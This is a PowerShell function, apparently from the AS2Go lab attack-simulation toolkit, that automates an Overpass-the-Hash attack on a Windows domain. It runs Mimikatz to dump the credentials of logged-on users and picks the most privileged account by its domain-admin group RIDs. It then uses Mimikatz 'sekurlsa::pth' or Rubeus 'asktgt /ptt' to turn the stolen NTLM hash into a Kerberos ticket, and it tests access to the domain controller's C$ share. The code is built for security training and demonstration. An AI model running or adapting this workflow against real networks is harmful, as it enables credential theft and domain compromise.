<#
.SYNOPSIS
Runs the AS2Go Overpass-the-Hash (OpTH) attack by reusing a captured NTLM hash on the Lab PC.

.DESCRIPTION
Enumerates local administrators and the configured Help Desk group on the Lab PC to identify privileged accounts.
Dumps credentials of recently logged-on users on the Lab PC with Mimikatz into a session log file.
Confirms the compromised Help Desk user and the captured NTLM hash, and offers corrections before execution.
Launches Mimikatz sekurlsa::pth in a new command window and shows the command required in that window.

.EXAMPLE
Invoke-OverPassTheHashAttack
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires the configured Help Desk user, the stored NTLM hash, and Mimikatz in the module tools folder.
Intended to run on the Lab PC where credentials of recently logged-on users can be dumped.

Tested with Get-FileHash -Path $mimikatzPath -Algorithm SHA256 to verify the integrity of the Mimikatz binary.
61C0810A23580CF492A6BA4F7654566108331E7A4134C968C2D6A05261B2D8A1
mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Lists local administrators and the configured Help Desk group to find a privileged account on the Lab PC.
Dumps recently logged-on credentials with Mimikatz and confirms the compromised user and NTLM hash.
Launches Mimikatz sekurlsa::pth so the stolen hash yields a Kerberos ticket in a new command window.
#>
function Invoke-OverPassTheHashAttack {
   
    $Info = Measure-FunctionRuntime -Begin

    Show-CurrentPhase -Phase "ASP07_OpTH.html"
    Update-WindowTitle -NewTitle "Overpass-the-Hash (OpTH) Attack"
    Set-ASConfig -Setting "LastStage" -Value "Overpass-the-Hash (OpTH) Attack"

    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Starting Overpass-the-Hash (OpTH) Attack on Lab PC"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = ".\mimikatz.exe  'privilege::debug' 'sekurlsa::logonpasswords' 'exit'"
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command


    $decision = "ExtractNew"

    If (-not $unattended) {

        $message = @"
Please confirm that the following prerequisites are met in the isolated test environment:
  • Run as Administrator
  • Credential Guard is not running on the Lab PC.
  • LSASS is not running as a protected process (PPL).
  • The credential-extraction tool will run with elevated administrator privileges.
  • Endpoint protection is not expected to interfere with the demonstration.
  • A privileged domain test account has logged on to the Lab PC.
  • The test account's NT hash is available or will be obtained during the demonstration.
  • The domain controller is reachable and accepts RC4-HMAC for the test account.
"@

        $title = "Is the Lab PC ready for the Overpass-the-Hash (OpTH) attack?"
        #$message = "Please confirm that the following prerequisites are met in the test enviroment:`n  • Credential Guard / VBS is not running..`n  • Endpoint protection is disabled.`n  • Privileged Account logged on the Lab PC."

        $Options = @(
            [pscustomobject] @{
                Label = "&Yes"
                Help  = "All prerequisites are met. Proceed with the PtH simulation."
                Value = $Script:Yes
            }

            [pscustomobject] @{
                Label = "&No"
                Help  = "The Lab PC is not ready. Skip the PtH simulation."
                Value = $Script:No
            }
        )

        # Default index must stay valid for both cases: last option ("Yes" if present, otherwise "Skip").
        $decision = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title

        if ($decision -eq $Script:No) {
            Measure-FunctionRuntime -End -Details $Info
            return
        }


        $result = Test-LocalAdministrator
        if (-not $result.IsElevated) {
            Write-AS2GoOutput -Type Error -Message "This function must be run as Administrator."
            pause
            return
        }

        $title = "NTLM Hash Availability"
        $message = "Choose whether to extract an NTLM hash using sekurlsa::logonpasswords or enter one manually for the OpTH simulation."

        $helpSkip = "Skip the Overpass-the-Hash (OpTH) simulation."

        if (-not $SafeMode) {

            $Options = @(
                [pscustomobject] @{
                    Label = "&Extract New"
                    Help  = "Run sekurlsa::logonpasswords to attempt to extract the test account's NTLM hash."
                    Value = "ExtractNew"
                }
                [pscustomobject] @{
                    Label = "&Add Manually"
                    Help  = "" #Manually enter the test account's NTLM hash."
                    Value = "AddManually"

                }
                [pscustomobject] @{
                    Label = "&Skip"
                    Help  = $helpSkip
                    Value = $Script:No
                }
            )
        }
        else {
            $Options = @(
                [pscustomobject] @{
                    Label = "&Skip"
                    Help  = $helpSkip
                    Value = $Script:No
                }
            )
        }




        # Default index must stay valid for both cases: last option ("Proceed" if present, otherwise "Skip").
        #$decision = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title

        $decision = "ExtractNew"

        if ($decision -eq $Script:No) {
            Measure-FunctionRuntime -End -Details $Info
            return
        }

    }

    If ($decision -eq "ExtractNew") {
  

        $name = get-date -Format 'yyyyMMddhhmmss'
        $CredentialDump = "$($Script:DefautExfiltrationFolder)\$name.pth"

        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe"  `
                "log $CredentialDump" `
                "privilege::debug" `
                "sekurlsa::logonpasswords" `
                "exit" }

        $uniqueResults = @(ConvertFrom-CredentialDump -Unique -Path $CredentialDump)
    
        If ($uniqueResults.Count -eq 0) {
            Write-AS2GoOutput -Type Error -Message "No Security Credentials found in Credential Dump."
            if (-not $unattended) { pause }
            return
        }
        else {
            Write-AS2GoOutput -Type Info -Message "Identified $($uniqueResults.Count) unique principals in Credential Dump."
        }
    

        $BestResults = $uniqueResults |
        ForEach-Object {
            $samAccountName = $_.Username
            $server = $_.FQDN

            $membership = @(
                Get-ADPrincipalGroupMembership `
                    -Identity $samAccountName `
                    -Server $server |
                Select-Object -Property Name, SID
            )

            $_ | Select-Object `
                Session,
            Domain,
            FQDN,
            UserName,
            NTLM,
            SID,
            LogonTime,
            @{
                Name       = 'GroupMembership'
                Expression = {
                    ($membership | ForEach-Object { $_.Name }) -join ', '
                }
            },
            @{
                Name       = 'GroupMembershipRids'
                Expression = {
                    ($membership | ForEach-Object { $_.SID.Value.split('-')[-1] }) -join ', '
                }
            }
        }

       
        Write-AS2GoOutput -Type H1 -Message "All Principals."
        $BestResults  | Select-Object Domain, Username, NTLM, GroupMembershipRids, SID | ft | out-host

        $BestPrincipal = foreach ($Rid in 519, 512, 548) {
            $MatchForRid = $BestResults | Sort-Object -Property LogonTime -Descending |
            Where-Object {
                $_.GroupMembershipRids -match "(?<!\d)$Rid(?!\d)"
            } |
            Select-Object -First 1

            if ($null -ne $MatchForRid) {
                $MatchForRid
                break
            }
        }

        Write-AS2GoOutput -Type H1 -Message "Best Principal."
        $BestPrincipal | Select-Object Domain, Username, GroupMembership | format-list | out-host
    
        $title = "Select an account for the next step. The recommended account is preselected."
        $message = "Review the group memberships before proceeding. Use Help to see details for the selected account."
        $options = @(New-Helpoptions -InputObject $BestResults -Label 'Username' -Help 'GroupMembership' -Value "IndexOf" -AddSkip)
        
        $index = [array]::IndexOf(@($BestResults), $BestPrincipal)

        $SelectedIndex = Show-DecisionPrompt -Message $message -Options $Options -Default $index -Title $title

        If ($SelectedIndex -eq $Script:No) {
            Measure-FunctionRuntime -End -Details $Info
            return
        }

        $Script:ASFQDN = $BestResults[$SelectedIndex].FQDN
        $Global:ASHelpDeskUser = $BestResults[$SelectedIndex].UserName
        $Script:ASPtHntml = $BestResults[$SelectedIndex].NTLM

    
        Write-AS2GoOutput -Type Info -Message "Finished extracting logon sessions from $CredentialDump."
    }
    elseif ($decision -eq "AddManually") {
        $Script:ASPtHntml = Write-AS2GoOutput -Type Input -Message "Manually enter the test account's NTLM hash."
        # Logic for manually adding an NTLM hash
    }


    Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
    Write-Highlight -Text ".\mimikatz.exe ", """privilege::", "debug", """ ""sekurlsa::", "pth", " /user:", $Global:ASHelpDeskUser , " /ntlm:", $Script:ASPtHntml, " /domain:", $Script:ASFQDN, """ ""exit"""   `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
    Write-Host ""


    Write-As2GoOutput -Type Command -Message "$($Script:ASTools)\Rubeus.exe asktgt /user:$($Global:ASHelpDeskUser) /domain:$($Script:ASFQDN) /rc4:$($Script:ASPtHntml) /ptt /nowrap"

    $Options = @(
        [pscustomobject] @{
            Label = "&Rubeus"
            Help  = "NO to cancel"
            Value = "Rubeus"
        },
        [pscustomobject] @{
            Label = "&Mimikatz"
            Help  = "YES to proceed"
            Value = "Mimikatz"
        },
        [pscustomobject] @{
            Label = "&Skip"
            Help  = "SKIP to bypass this operation"
            Value = $Script:Skip
        }
    )

    $Title = "Decision Required"
    $message = "Please make a decision:"
    $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title

    If ($answer -eq "Mimikatz") {
        Invoke-Command -ScriptBlock {
            & "$($Script:ASTools)\mimikatz.exe" `
                "privilege::debug" `
                "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN /run:pwsh.exe" `
                "exit"
        }

        Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
        Write-AS2GoOutput -Type Info -Message "The overpass-the-hash command opened a new command window for the ticket injection."
        Write-AS2GoOutput -Type NextCommand -Message "Please run the following command from the new terminal window" -NoExtraLines
        Write-AS2GoOutput -Type Command -NoExtraLines -Message "dir $($env:LogonServer)\c$"
    }
    elseif ($answer -eq "Rubeus") {

        Invoke-Command -ScriptBlock {
            & "$($Script:ASTools)\Rubeus.exe" asktgt /user:$Global:ASHelpDeskUser /domain:$Script:ASFQDN /rc4:$Script:ASPtHntml /ptt /nowrap
        }
        Test-AccessToOneDCPerDomain
        $tickets = Get-KlistTicket
        $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
        Write-AS2GoOutput -Type Info -Message "Last Ticket"
        $tickets | Select-object -Last 1 | Format-List

    }
    elseif ($answer -eq $Script:Skip) {
    }


    if (-not $UnAttended ) { pause }

    $Title = "Was the operation successful?"
    $message = "Do you want to save the hash credentials?"
    $answer = Show-DecisionPrompt -Message $message  -Default 0 -Title $title
    If ($answer -eq $Script:Yes) {
        Set-ASConfig -Setting "ASP07NT" -Value "$($Script:ASFQDN)|$($Global:ASHelpDeskUser)|$($Script:ASPtHntml)" -DPAPI
    }        
   
    Measure-FunctionRuntime -End -Details $Info
}
